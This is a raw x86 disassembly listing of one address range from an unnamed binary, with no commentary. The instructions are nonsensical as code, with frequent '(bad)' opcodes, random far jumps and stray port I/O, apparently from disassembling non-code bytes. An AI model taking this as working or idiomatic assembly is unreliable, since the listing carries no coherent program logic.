  40bc13:	jno    0x40bc18
  40bc15:	dec    ebx
  40bc16:	cmp    dl,cl
  40bc18:	push   eax
  40bc19:	enter  0xcc1e,0xa1
  40bc1d:	lahf   
  40bc1e:	push   ebx
  40bc1f:	xor    ecx,esp
  40bc21:	inc    ebp
  40bc22:	adc    ah,bh
  40bc24:	mov    edx,0xa0e1e2c2
  40bc29:	xor    eax,0x31b747da
  40bc2e:	sbb    edi,DWORD PTR [edi+0x4fb0e21]
  40bc34:	loope  0x40bc86
  40bc36:	pop    eax
  40bc37:	fs xchg ebp,eax
  40bc39:	dec    eax
  40bc3a:	sbb    BYTE PTR [eax+0x755799aa],dl
  40bc40:	lods   eax,DWORD PTR ds:[esi]
  40bc41:	inc    ebp
  40bc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc43:	dec    eax
  40bc44:	loope  0x40bc70
  40bc46:	(bad)
  40bc4a:	(bad)  
  40bc4b:	in     al,0xf9
  40bc4d:	popf   
  40bc4e:	int    0x5b
  40bc50:	mov    dl,0x52
  40bc52:	lahf   
  40bc53:	call   0x77337714
  40bc58:	mov    ebx,0x64f2dc54
  40bc5d:	xor    BYTE PTR [edx-0x32b015db],0x43
  40bc64:	and    BYTE PTR [ebx-0x5e50faeb],al
  40bc6a:	lahf   
  40bc6b:	dec    ebx
  40bc6c:	mov    ecx,0x4ec97e77
  40bc71:	mov    edi,0x89c231a
  40bc76:	sub    BYTE PTR [ebp-0x249dd9e1],bh
  40bc7c:	shr    BYTE PTR [edi-0x23],cl
  40bc7f:	int    0x6d
  40bc81:	leave  
  40bc82:	mov    dl,BYTE PTR [ecx+ebp*4-0x2a]
  40bc86:	adc    al,al
  40bc88:	call   0xf49bec5c
  40bc8d:	out    0x8,al
  40bc8f:	leave  
  40bc90:	xchg   ecx,eax
  40bc91:	inc    esp
  40bc92:	pop    es
  40bc93:	jmp    0x236d9d8e
  40bc98:	jae    0x40bcac
  40bc9a:	ror    BYTE PTR [ebp-0x59],cl
  40bc9d:	in     eax,dx
  40bc9e:	jl     0x40bc9c
  40bca0:	sbb    dl,ah
  40bca2:	test   DWORD PTR [eax-0x1],ebx
  40bca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bca6:	(bad)
  40bca9:	mov    dl,0xc1
  40bcab:	adc    BYTE PTR [eax+eax*2-0x6a6a759c],0x4f
  40bcb3:	or     BYTE PTR [edx+0x34],0xbf
  40bcb7:	cmp    DWORD PTR [esi-0x7749299b],0xffffffd7
  40bcbe:	mov    fs,esi
  40bcc0:	xlat   BYTE PTR ds:[ebx]
  40bcc1:	sub    BYTE PTR [esi+eax*8-0x1f6feda7],ah
  40bcc8:	in     al,0xf6
  40bcca:	xor    ah,0x87
  40bccd:	sub    cl,BYTE PTR [esi+0x24]
  40bcd0:	cmp    bl,BYTE PTR fs:[ebp+0x7038eca5]
  40bcd7:	aad    0x9d
  40bcd9:	dec    BYTE PTR [edi+0x47a6a077]
  40bcdf:	aas    
  40bce0:	(bad)  
  40bce1:	sub    eax,0xddc7af23
  40bce6:	mov    eax,0xcc0cecc2
  40bceb:	imul   ecx,DWORD PTR [edi],0x17cad24f
  40bcf1:	adc    eax,0xde30e4cb
  40bcf6:	in     eax,0x1d
  40bcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf9:	ja     0x40bc8b
  40bcfb:	mov    ds:0x247400c7,eax
  40bd00:	leave  
  40bd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd02:	test   BYTE PTR [eax+0x1a],ch
  40bd05:	and    al,cl
  40bd07:	jbe    0x40bd32
  40bd09:	(bad)  
  40bd0a:	push   ebx
  40bd0b:	mov    ah,0x1f
  40bd0d:	or     DWORD PTR [eax-0x65],ebp
  40bd10:	test   bl,al
  40bd12:	out    0x75,al
  40bd14:	or     al,0xfb
  40bd16:	cld    
  40bd17:	xlat   BYTE PTR ds:[ebx]
  40bd18:	xor    al,0xdb
  40bd1a:	cld    
  40bd1b:	mov    edi,0x5292d6cc
  40bd20:	xchg   ebx,eax
  40bd21:	inc    edx
  40bd22:	ja     0x40bcd0
  40bd24:	add    esp,esi
  40bd26:	test   eax,0x3446878d
  40bd2b:	(bad)  
  40bd2c:	retf   
  40bd2d:	lods   eax,DWORD PTR ds:[esi]
  40bd2e:	rcr    BYTE PTR [ebx],cl
  40bd30:	jne    0x40bd07
  40bd32:	sub    ebp,edi
  40bd34:	loop   0x40bd7b
  40bd36:	les    edx,FWORD PTR [ecx]
  40bd38:	inc    esp
  40bd39:	gs fwait
  40bd3b:	lods   eax,DWORD PTR ds:[esi]
  40bd3c:	xlat   BYTE PTR ds:[ebx]
  40bd3d:	add    al,0xb2
  40bd3f:	mov    ecx,0x61bf308f
  40bd44:	push   ecx
  40bd45:	cmp    DWORD PTR [esi+eiz*4],ecx
  40bd48:	fs push edx
  40bd4a:	sub    ah,BYTE PTR [eax+0x46]
  40bd4d:	arpl   cx,di
  40bd4f:	push   edi
  40bd50:	mov    fs:0x9f9bfc58,al
  40bd56:	cmp    eax,0xdb640a62
  40bd5b:	aaa    
  40bd5c:	stos   BYTE PTR es:[edi],al
  40bd5d:	into   
  40bd5e:	sbb    dh,cl
  40bd60:	dec    ebp
  40bd61:	mov    al,ds:0x2282da7
  40bd66:	push   ebp
  40bd67:	add    dh,BYTE PTR [edx]
  40bd69:	jge    0x40bd20
  40bd6b:	rep ins DWORD PTR es:[edi],dx
  40bd6d:	sub    dl,BYTE PTR [eax]
  40bd6f:	mov    eax,0xd2c53a68
  40bd74:	gs cs adc bh,ch
  40bd78:	bound  edi,QWORD PTR [ebp-0x7e]
  40bd7b:	imul   BYTE PTR ds:0x7c8cae21
  40bd81:	out    dx,al
  40bd82:	dec    edx
  40bd83:	cli    
  40bd84:	imul   ebp,DWORD PTR ds:0x9e20e309,0xffffffd7
  40bd8b:	push   ebx
  40bd8c:	in     eax,0x3a
  40bd8e:	scas   al,BYTE PTR es:[edi]
  40bd8f:	int    0xc5
  40bd91:	inc    ebx
  40bd92:	sahf   
  40bd93:	scas   al,BYTE PTR es:[edi]
  40bd94:	add    ah,BYTE PTR [eax+0x45dc3ec2]
  40bd9a:	(bad)  
  40bd9c:	retf   0x537d
  40bd9f:	or     edx,DWORD PTR [eax+eiz*1+0x60]
  40bda3:	mov    dh,0xbb
  40bda5:	jmp    0x9beb:0xb42f3443
  40bdac:	pop    ds
  40bdad:	inc    edx
  40bdae:	xor    DWORD PTR ds:0x85e84f1c,ebp
  40bdb4:	jg     0x40bdc1
  40bdb6:	out    0x1e,eax
  40bdb8:	lods   eax,DWORD PTR ds:[esi]
  40bdb9:	out    dx,al
  40bdba:	repz cwde 
  40bdbc:	push   ss
  40bdbd:	test   al,0xc9
  40bdbf:	adc    al,0xbb
  40bdc1:	sub    eax,0xb4e56e3c
  40bdc6:	sti    
  40bdc7:	mov    eax,ds:0xc7f10d8f
  40bdcc:	int    0xb7
  40bdce:	inc    esi
  40bdcf:	pop    edi
  40bdd0:	mov    ds:0x7a2fa205,eax
  40bdd5:	in     eax,0xec
  40bdd7:	daa    
  40bdd8:	aad    0x22
  40bdda:	ret    
  40bddb:	adc    al,0xb6
  40bddd:	or     ch,cl
  40bddf:	imul   edx,ebx,0x23
  40bde2:	call   0x7f9e9210
  40bde7:	mov    dh,0x7c
  40bde9:	pop    edx
  40bdea:	sbb    cl,BYTE PTR ds:[ebp+0x44]
  40bdee:	lea    ebp,[edx-0x80]
  40bdf1:	xor    al,0x28
  40bdf3:	aad    0x78
  40bdf5:	xchg   ebx,eax
  40bdf6:	stos   BYTE PTR es:[edi],al
  40bdf7:	and    eax,0xa4c99781
  40bdfc:	or     DWORD PTR [eax+eax*8],esi
  40bdff:	(bad)  
  40be00:	div    dl
  40be02:	adc    ch,BYTE PTR [edi]
  40be04:	js     0x40be02
  40be06:	fisubr WORD PTR [edi]
  40be08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be09:	or     al,bh
  40be0b:	ja     0x40be32
  40be0d:	loop   0x40bdbc
  40be0f:	add    ch,ch
  40be11:	lods   al,BYTE PTR cs:[esi]
  40be13:	jmp    0xa22a2710
  40be18:	xchg   BYTE PTR [edi],ch
  40be1a:	ret    0x2b16
  40be1d:	je     0x40be95
  40be1f:	lea    edi,[edx+0x34]
  40be22:	jge    0x40be86
  40be24:	adc    ch,dh
  40be26:	jmp    0x40be13
  40be28:	inc    ebp
  40be29:	pop    esi
  40be2a:	cmp    eax,0x25c6f366
  40be2f:	aad    0xeb
  40be31:	test   DWORD PTR [edx],esp
  40be33:	(bad)  
  40be34:	idiv   ecx
  40be36:	mov    edi,0x93884b23
  40be3b:	ficom  WORD PTR cs:[esp+esi*1]
  40be3f:	rcl    BYTE PTR [edi-0x4c15f970],cl
  40be45:	mov    dh,0xc4
  40be47:	adc    al,0x81
  40be49:	stc    
  40be4a:	cmp    eax,0x119c92bf
  40be4f:	repnz fnsave [edi-0x1d7ec4f8]
  40be56:	pop    esp
  40be57:	fstp   DWORD PTR [ecx+ebp*2-0x1e]
  40be5b:	in     al,0xc6
  40be5d:	push   bx
  40be5f:	adc    eax,0x53c67d76
  40be64:	xor    al,0x57
  40be66:	cwde   
  40be67:	icebp  
  40be68:	push   esi
  40be69:	or     ebp,ecx
  40be6b:	mov    ch,0xd8
  40be6d:	xchg   cl,ch
  40be6f:	inc    eax
  40be70:	imul   cl
  40be72:	in     eax,dx
  40be73:	jmp    0xf78e:0xa0baa190
  40be7a:	into   
  40be7b:	jge    0x40be24
  40be7d:	(bad)  
  40be7e:	imul   ebp,DWORD PTR [ebp-0x4e8f03ce],0xfffffff7
  40be85:	mov    ch,0x26
  40be87:	loopne 0x40be32
  40be89:	aaa    
  40be8a:	test   eax,0x5db34129
  40be8f:	nop
  40be90:	adc    bl,BYTE PTR [edi+0x56]
  40be93:	inc    ecx
  40be94:	mov    esp,0x9a37e1b8
  40be99:	xor    DWORD PTR [eax],ebp
  40be9b:	loop   0x40be60
  40be9d:	mov    dh,BYTE PTR ds:0x1d8eeedf
  40bea3:	ret    0x7b2c
  40bea6:	stos   DWORD PTR es:[edi],eax
  40bea7:	aaa    
  40bea8:	or     BYTE PTR [ecx+0x60],ah
  40beab:	dec    ecx
  40beac:	mov    eax,ds:0xac8dc845
  40beb1:	je     0x40bec5
  40beb3:	fucomp st(6)
  40beb5:	dec    ecx
  40beb6:	aaa    
  40beb7:	and    eax,edx
  40beb9:	pop    ss
  40beba:	std    
  40bebb:	lea    esp,[edi-0x4bf071b8]
  40bec1:	in     eax,dx
  40bec2:	push   eax
  40bec3:	sub    DWORD PTR [ecx],0x61008b53
  40bec9:	lds    esi,FWORD PTR [esi+0x2e]
  40becc:	push   esi
  40becd:	mov    ?,ebx
  40becf:	cld    
  40bed0:	repnz push ecx
  40bed2:	mov    bh,0x22
  40bed4:	push   0x85ad4a84
  40bed9:	jb     0x40bf2d
  40bedb:	inc    BYTE PTR [ebx+0x3d]
  40bede:	xlat   BYTE PTR ds:[ebx]
  40bedf:	(bad)  
  40bee0:	adc    DWORD PTR [ecx],esp
  40bee2:	fwait
  40bee3:	inc    ebp
  40bee4:	sbb    dl,BYTE PTR [esi-0x7cf79a1f]
  40beea:	jno    0x40beb4
  40beec:	and    al,0x3
  40beee:	call   0xfc2f:0x81c75432
  40bef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef6:	or     al,0xc6
  40bef8:	(bad)  [edi-0x40]
  40befb:	adc    eax,0xc11a68d7
  40bf00:	inc    eax
  40bf01:	jp     0x40beeb
  40bf03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf04:	(bad)  
  40bf05:	mov    bl,0xbd
  40bf07:	xchg   esp,eax
  40bf08:	rcl    edi,1
  40bf0a:	pop    ds
  40bf0b:	adc    eax,DWORD PTR [edi+0x5b]
  40bf0e:	xchg   BYTE PTR [ebx+0x6],al
  40bf11:	nop
  40bf12:	jge    0x40bf43
  40bf14:	ins    DWORD PTR es:[edi],dx
  40bf15:	pusha  
  40bf16:	xchg   ecx,eax
  40bf17:	out    dx,al
  40bf18:	test   eax,0xa6a5465c
  40bf1d:	lods   al,BYTE PTR ds:[esi]
  40bf1e:	pop    esp
  40bf1f:	rcr    DWORD PTR [eax+ecx*2],cl
  40bf22:	mov    ah,0xd8
  40bf24:	mov    esp,0x5d25001c
  40bf29:	push   ecx
  40bf2a:	inc    edx
  40bf2b:	mov    eax,0x728bafb1
  40bf30:	ds ins DWORD PTR es:[edi],dx
  40bf32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf33:	into   
  40bf34:	lds    esi,FWORD PTR [ebp+0x69a2d6d9]
  40bf3a:	xchg   edi,eax
  40bf3b:	jmp    FWORD PTR [ebx+0x6abf06f0]
  40bf41:	inc    eax
  40bf42:	repz adc al,0xd0
  40bf45:	sbb    al,0x87
  40bf47:	rcr    DWORD PTR [ebx+ebp*1-0x1996f68f],0x5
  40bf4f:	add    cl,ah
  40bf51:	sbb    eax,0x6f88af9b
  40bf56:	repnz std 
  40bf58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf59:	lahf   
  40bf5a:	push   ds
  40bf5b:	loopne 0x40bf81
  40bf5d:	lds    ecx,FWORD PTR [eax-0x15b215c2]
  40bf63:	cmp    eax,0x8071503e
  40bf68:	push   eax
  40bf69:	pop    DWORD PTR [ecx-0x71]
  40bf6c:	je     0x40bf55
  40bf6e:	and    BYTE PTR [ebx+0x5],bh
  40bf71:	fsub   st,st(7)
  40bf73:	xchg   ecx,eax
  40bf74:	jle    0x40bf73
  40bf76:	test   DWORD PTR [edx+0x49],eax
  40bf79:	aad    0xa4
  40bf7b:	adc    BYTE PTR [ecx+0x5409ee59],bl
  40bf81:	sbb    eax,DWORD PTR [esi-0x2da0ee3a]
  40bf87:	jp     0x40bf73
  40bf89:	push   ebp
  40bf8a:	rcl    ebx,0xcb
  40bf8d:	inc    ebp
  40bf8e:	ins    DWORD PTR es:[edi],dx
  40bf8f:	push   ebx
  40bf90:	sti    
  40bf91:	fwait
  40bf92:	lea    ebp,[eax+eax*2+0x61]
  40bf96:	scas   al,BYTE PTR es:[edi]
  40bf97:	out    0x97,eax
  40bf99:	cld    
  40bf9a:	pop    es
  40bf9b:	add    BYTE PTR [edx],bh
  40bf9d:	cmp    al,0xce
  40bf9f:	inc    esi
  40bfa0:	pop    eax
  40bfa1:	cmp    eax,0xabf7fbcc
  40bfa6:	stos   BYTE PTR es:[edi],al
  40bfa7:	adc    bh,BYTE PTR [ebx+0x6131433b]
  40bfad:	cmp    eax,0x6082c0a3
  40bfb2:	or     eax,0xa59ceb86
  40bfb7:	outs   dx,DWORD PTR ds:[esi]
  40bfb8:	loopne 0x40c014
  40bfba:	fld    QWORD PTR ds:[esi]
  40bfbd:	mov    eax,0x1881cc4c
  40bfc2:	hlt    
  40bfc3:	pop    ds
  40bfc4:	sub    al,0x4c
  40bfc6:	cmc    
  40bfc7:	repnz or DWORD PTR [bp+si],ebx
  40bfcb:	pushf  
  40bfcc:	ret    0xcd52
  40bfcf:	sub    dh,dl
  40bfd1:	test   eax,0x56a1dfce
  40bfd6:	(bad)  ds:0xd06350de
  40bfdc:	loopne 0x40c01a
  40bfde:	xor    al,0xec
  40bfe0:	call   0xe51789ae
  40bfe5:	in     eax,0x5e
  40bfe7:	jp     0x40c05e
  40bfe9:	(bad)  
  40bfea:	sbb    edx,edx
  40bfec:	adc    eax,0x906a60e1
  40bff1:	(bad)  
  40bff2:	mov    al,ds:0x26f31f12
  40bff7:	jbe    0x40bfb9
  40bff9:	outs   dx,BYTE PTR ds:[esi]
  40bffa:	test   al,0x4
  40bffc:	lods   eax,DWORD PTR ds:[esi]
  40bffd:	hlt    
  40bffe:	enter  0x69fe,0x80
  40c002:	repz data16 int3 
  40c005:	pop    esp
  40c006:	jl     0x40bfa2
  40c008:	scas   al,BYTE PTR es:[edi]
  40c009:	jg     0x40c079
  40c00b:	es mov bh,0x93
  40c00e:	mov    ebp,es
  40c010:	repz fldenv [esi+0x7bc0713c]
  40c017:	adc    ebx,edx
  40c019:	in     al,dx
  40c01a:	std    
  40c01b:	pop    ecx
  40c01c:	inc    ebp
  40c01d:	push   eax
  40c01e:	xchg   edx,eax
  40c01f:	inc    edi
  40c020:	call   0x7aa5:0xf4ead620
  40c027:	or     al,0x87
  40c029:	add    DWORD PTR [edi],esp
  40c02b:	fnstcw WORD PTR [ecx]
  40c02d:	lods   al,BYTE PTR ds:[esi]
  40c02f:	push   edi
  40c030:	mov    BYTE PTR [esi+0x265a861a],ah
  40c036:	test   al,0x55
  40c038:	xchg   DWORD PTR [ecx+0x6a9a3bfd],esi
  40c03e:	inc    ecx
  40c03f:	push   ebx
  40c040:	fld    TBYTE PTR [ebx+0x5c35d751]
  40c046:	xor    bl,BYTE PTR [esi-0x29]
  40c049:	xor    ebx,DWORD PTR [eax+ecx*8+0x53]
  40c04d:	dec    ebp
  40c04e:	test   DWORD PTR [ebp-0xb],esi
  40c051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c052:	adc    eax,esp
  40c054:	sbb    dh,BYTE PTR [ecx-0x20]
  40c057:	adc    DWORD PTR [esi+edx*8-0x5dcbb58d],ecx
  40c05e:	outs   dx,DWORD PTR ds:[esi]
  40c05f:	int    0x21
  40c061:	std    
  40c062:	push   ds
  40c063:	(bad)  
  40c064:	test   BYTE PTR [edx+0x6eaf29be],0x33
  40c06b:	les    esi,FWORD PTR [edi+0xe]
  40c06e:	fwait
  40c06f:	scas   al,BYTE PTR es:[edi]
  40c070:	inc    edx
  40c071:	scas   eax,DWORD PTR es:[edi]
  40c072:	push   ebp
  40c073:	stos   BYTE PTR es:[edi],al
  40c074:	clc    
  40c075:	imul   BYTE PTR [ebp+0x5a]
  40c078:	data16 (bad) 
  40c07a:	int3   
  40c07b:	ins    BYTE PTR es:[edi],dx
  40c07c:	or     bl,ah
  40c07e:	(bad)  
  40c07f:	xor    DWORD PTR [ecx+ebp*1+0x301e11d9],esi
  40c086:	lods   al,BYTE PTR ds:[esi]
  40c087:	cmp    eax,DWORD PTR [ebp+0x5c]
  40c08a:	push   ss
  40c08b:	cmp    cl,BYTE PTR [ebx]
  40c08d:	sub    cl,BYTE PTR [esi]
  40c08f:	int    0x56
  40c091:	icebp  
  40c092:	push   eax
  40c093:	fadd   st(2),st
  40c095:	call   0x3a5fd61d
  40c09a:	stos   DWORD PTR es:[edi],eax
  40c09b:	pop    ebx
  40c09c:	pop    eax
  40c09d:	add    BYTE PTR [ebx],dh
  40c09f:	xchg   ebp,eax
  40c0a0:	add    BYTE PTR [eax+0x56233e41],0x87
  40c0a7:	dec    ebx
  40c0a8:	call   0x81da:0xe100d411
  40c0af:	lds    eax,FWORD PTR [ebx-0x4cd53d86]
  40c0b5:	push   esp
  40c0b6:	hlt    
  40c0b7:	mov    WORD PTR [ebp-0x73],es
  40c0ba:	or     al,cl
  40c0bc:	sbb    al,0x21
  40c0be:	cdq    
  40c0bf:	aam    0xa9
  40c0c1:	popf   
  40c0c2:	ss dec ecx
  40c0c4:	or     esp,DWORD PTR [edi+0x6c]
  40c0c7:	adc    bh,BYTE PTR [esi-0x575b3089]
  40c0cd:	(bad)  
  40c0ce:	jne    0x40c0ce
  40c0d0:	inc    edx
  40c0d1:	cdq    
  40c0d2:	add    BYTE PTR cs:[ebp+0x5a32e9b0],cl
  40c0d9:	test   BYTE PTR [ebp-0x5880ebd6],ch
  40c0df:	cli    
  40c0e0:	pop    edx
  40c0e1:	ds addr16 pop ecx
  40c0e4:	and    DWORD PTR [edx],ebx
  40c0e6:	or     bl,BYTE PTR [esi+eiz*8]
  40c0e9:	push   ss
  40c0ea:	jecxz  0x40c0e9
  40c0ec:	aam    0xea
  40c0ee:	nop
  40c0ef:	loope  0x40c114
  40c0f1:	jbe    0x40c0cf
  40c0f3:	aaa    
  40c0f4:	shl    esi,1
  40c0f6:	mov    ds:0xdd87fdaf,al
  40c0fb:	push   0xffffffd5
  40c0fd:	sbb    ecx,DWORD PTR [edx+0x78]
  40c100:	lods   al,BYTE PTR ds:[esi]
  40c101:	scas   eax,DWORD PTR es:[edi]
  40c102:	push   0x51d613ec
  40c107:	cmp    BYTE PTR [edx-0x42],dl
  40c10a:	inc    edi
  40c10b:	(bad)  
  40c10c:	rol    BYTE PTR [esi+ebx*4],1
  40c10f:	gs pop ebp
  40c111:	or     al,0x92
  40c113:	xor    BYTE PTR ds:0x6286cd92,cl
  40c119:	inc    DWORD PTR [ebx]
  40c11b:	int3   
  40c11c:	shl    DWORD PTR [eax+0x4d6d4e18],1
  40c122:	hlt    
  40c123:	out    dx,al
  40c124:	mov    esi,0x61af7784
  40c129:	(bad)  
  40c12a:	sub    eax,0x8f75d92b
  40c12f:	add    esi,edx
  40c131:	adc    DWORD PTR [eax],0x2
  40c134:	and    ebx,0xffffff8f
  40c137:	and    eax,0x3a81453d
  40c13c:	fistp  DWORD PTR [ecx-0x4]
  40c13f:	outs   dx,DWORD PTR ds:[esi]
  40c140:	or     ecx,ecx
  40c142:	(bad)  
  40c143:	rol    DWORD PTR [ebx],1
  40c145:	aaa    
  40c146:	ret    
  40c147:	in     eax,dx
  40c148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c149:	or     DWORD PTR [ebx+eiz*1-0x710c027e],esi
  40c150:	cmc    
  40c151:	outs   dx,DWORD PTR ds:[esi]
  40c152:	add    bl,BYTE PTR [esi+0x70]
  40c155:	push   es
  40c156:	inc    edi
  40c157:	mov    edx,0x38e4587a
  40c15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c15d:	sub    al,0x3
  40c15f:	xor    bl,dh
  40c161:	imul   ebx,DWORD PTR [edi-0x521eb67f],0xfffffff8
  40c168:	loop   0x40c1c2
  40c16a:	xchg   ebp,eax
  40c16c:	iret   
  40c16d:	push   es
  40c16e:	and    eax,0x58b00361
  40c173:	cmp    esp,esp
  40c175:	dec    edx
  40c176:	fxam   
  40c178:	(bad)  
  40c17a:	fwait
  40c17b:	inc    edx
  40c17c:	aas    
  40c17d:	sub    ebp,DWORD PTR [ebx+0xddd0ff7]
  40c183:	or     BYTE PTR [ebx+0x3e57f004],0x41
  40c18a:	mov    DWORD PTR [eax+0x55],edx
  40c18d:	(bad)  
  40c18e:	arpl   WORD PTR [ecx+eiz*4+0x477105d2],cx
  40c195:	jmp    FWORD PTR [edi-0x20]
  40c198:	and    esi,esi
  40c19a:	sti    
  40c19b:	push   cs
  40c19c:	in     eax,dx
  40c19d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c19e:	xlat   BYTE PTR ds:[ebx]
  40c19f:	sbb    BYTE PTR [esi+0x1440c953],dh
  40c1a5:	(bad)  ds:0x3f53e38
  40c1ab:	jbe    0x40c145
  40c1ad:	mov    al,ds:0x63082146
  40c1b2:	xchg   DWORD PTR [ecx+0x7],eax
  40c1b5:	inc    esi
  40c1b6:	retf   
  40c1b7:	ins    DWORD PTR es:[edi],dx
  40c1b8:	(bad)  
  40c1b9:	(bad)  
  40c1ba:	jo     0x40c16f
  40c1bc:	xor    al,0xa4
  40c1be:	lea    ecx,[edx+0x2b25ed8b]
  40c1c4:	push   ss
  40c1c5:	int3   
  40c1c6:	(bad)  
  40c1c7:	int3   
  40c1c8:	push   ebx
  40c1c9:	adc    eax,0x6ea3b8c4
  40c1ce:	ins    BYTE PTR es:[edi],dx
  40c1cf:	mov    al,ds:0x49de4d91
  40c1d4:	sub    dh,dh
  40c1d6:	ret    0x557b
  40c1d9:	mov    dl,0x6
  40c1db:	jg     0x40c253
  40c1dd:	dec    edi
  40c1de:	push   ebx
  40c1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e0:	inc    edi
  40c1e1:	push   edx
  40c1e2:	(bad)  [ebp-0x2968d0f9]
  40c1e8:	ror    esi,0xd
  40c1eb:	call   0x4f2f:0x336597bc
  40c1f2:	ror    dl,cl
  40c1f4:	addr16 mov cl,0x74
  40c1f7:	inc    ebx
  40c1f8:	es test eax,0xedef8649
  40c1fe:	fst    QWORD PTR [eax+ecx*8-0x69af88b7]
  40c205:	addr16 nop
  40c207:	iret   
  40c208:	adc    al,0xe5
  40c20a:	mov    esp,0x6c720834
  40c20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c210:	mov    edi,0x7f70f4a8
  40c215:	push   ebp
  40c216:	out    0xaf,eax
  40c218:	cld    
  40c219:	cmp    al,0x8a
  40c21b:	ret    
  40c21c:	cmp    ebp,ecx
  40c21e:	dec    ebp
  40c21f:	mov    bh,0x59
  40c221:	sub    bh,BYTE PTR [ebp+0x56]
  40c224:	fdivrp st(3),st
  40c226:	out    0x56,al
  40c228:	mov    bh,0x59
  40c22a:	aad    0x2e
  40c22c:	scas   eax,DWORD PTR es:[edi]
  40c22d:	mov    al,0x8b
  40c22f:	nop
  40c230:	fsubr  st(0),st
  40c232:	js     0x40c1cd
  40c234:	ins    DWORD PTR es:[edi],dx
  40c235:	leave  
  40c236:	add    DWORD PTR [ebp-0x7719b507],0x8e14b0f0
  40c240:	dec    BYTE PTR [edi-0x6f]
  40c243:	and    BYTE PTR [esi+0x59],0xde
  40c247:	shl    DWORD PTR [ebx-0x31],cl
  40c24a:	lock ja 0x40c207
  40c24d:	(bad)  
  40c24e:	jmp    0xcc7b0e15
  40c253:	out    0x75,al
  40c255:	cmovl  esp,ecx
  40c258:	les    edi,FWORD PTR [ecx+0x2469e07b]
  40c25e:	arpl   WORD PTR [edx],si
  40c260:	fidivr WORD PTR [edi]
  40c262:	xor    BYTE PTR [ebp-0x1c],dh
  40c265:	popa   
  40c266:	xor    BYTE PTR [esi+eax*1],bl
  40c269:	cwde   
  40c26a:	stos   DWORD PTR es:[edi],eax
  40c26b:	(bad)  
  40c26c:	adc    eax,0xe6099124
  40c271:	rcr    DWORD PTR [edx-0x6cb5215c],1
  40c277:	pop    es
  40c278:	cmp    ah,BYTE PTR [ebp+edi*8-0x79]
  40c27c:	mov    al,ds:0xb74bb137
  40c281:	scas   al,BYTE PTR es:[edi]
  40c282:	dec    esp
  40c283:	cdq    
  40c284:	popf   
  40c285:	sti    
  40c286:	and    BYTE PTR [esi-0xd6afbab],al
  40c28c:	loop   0x40c215
  40c28e:	(bad)  
  40c28f:	mov    ds:0x88842c87,eax
  40c294:	and    eax,0x4e81a86a
  40c299:	xbegin 0x5fac26d
  40c29f:	sub    al,0x52
  40c2a1:	icebp  
  40c2a2:	pop    edx
  40c2a3:	test   al,0xe7
  40c2a5:	or     BYTE PTR [eax+0xfcc5eb7],bh
  40c2ab:	xor    BYTE PTR [esi],al
  40c2ad:	sahf   
  40c2ae:	in     eax,0x7d
  40c2b0:	stos   DWORD PTR es:[edi],eax
  40c2b1:	stc    
  40c2b2:	test   al,0x35
  40c2b4:	push   edi
  40c2b5:	and    esp,edi
  40c2b7:	mov    esi,0x8fdef812
  40c2bc:	jmp    0x40c30b
  40c2be:	xlat   BYTE PTR ds:[ebx]
  40c2bf:	repz sahf 
  40c2c1:	jnp    0x40c245
  40c2c3:	mov    dh,0x1f
  40c2c5:	mov    esp,0xf8ae8252
  40c2ca:	sbb    edi,DWORD PTR [eax+0x4d]
  40c2cd:	jns    0x40c2f6
  40c2cf:	push   ecx
  40c2d0:	adc    DWORD PTR [esi-0x7b],ebp
  40c2d3:	dec    esp
  40c2d4:	in     al,dx
  40c2d5:	cwde   
  40c2d6:	ret    
  40c2d7:	popa   
  40c2d8:	hlt    
  40c2d9:	popf   
  40c2da:	sub    bl,BYTE PTR [edi+0x27]
  40c2dd:	sbb    eax,0x1ff9dc48
  40c2e2:	or     BYTE PTR [ecx],cl
  40c2e4:	dec    edx
  40c2e5:	mov    edx,0xe048746a
  40c2ea:	and    DWORD PTR [edi+0x3709d9f9],0x34
  40c2f1:	mov    WORD PTR [eax+0x33],cs
  40c2f4:	retf   0x9c6
  40c2f7:	test   al,0x66
  40c2f9:	sar    dl,0xc9
  40c2fc:	xchg   esi,eax
  40c2fd:	mov    ah,0x78
  40c2ff:	dec    edi
  40c300:	outs   dx,BYTE PTR ds:[esi]
  40c301:	leave  
  40c302:	imul   ecx,DWORD PTR [ebx],0xffffffaf
  40c305:	or     dh,BYTE PTR [esi]
  40c307:	sub    bl,al
  40c309:	shl    DWORD PTR [edx+0x68],0x3f
  40c30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c30e:	cmp    DWORD PTR [esi+0x5f],ebp
  40c311:	jp     0x40c2be
  40c313:	jg     0x40c323
  40c315:	mov    ds:0xcfc03f5d,al
  40c31a:	jp     0x40c329
  40c31c:	mov    ebx,DWORD PTR [esi-0x4c13ab60]
  40c322:	inc    ecx
  40c323:	imul   esp,DWORD PTR [eax+ebx*2+0x5],0x910251ea
  40c32b:	test   BYTE PTR [esi+esi*8-0x2a1ffc35],dl
  40c332:	retf   
  40c333:	or     BYTE PTR [esi-0x607c8e50],0xc7
  40c33a:	or     BYTE PTR [eax],bl
  40c33c:	jns    0x40c365
  40c33e:	shl    BYTE PTR [ebp-0x1b],cl
  40c341:	cs das 
  40c343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c345:	mov    eax,0x170f625a
  40c34a:	inc    ebx
  40c34b:	pop    DWORD PTR [ecx-0x71]
  40c34e:	(bad)  
  40c34f:	fist   WORD PTR [ecx-0x4ad7e16a]
  40c355:	adc    bh,bh
  40c357:	and    bl,BYTE PTR [esp+eax*2+0x74]
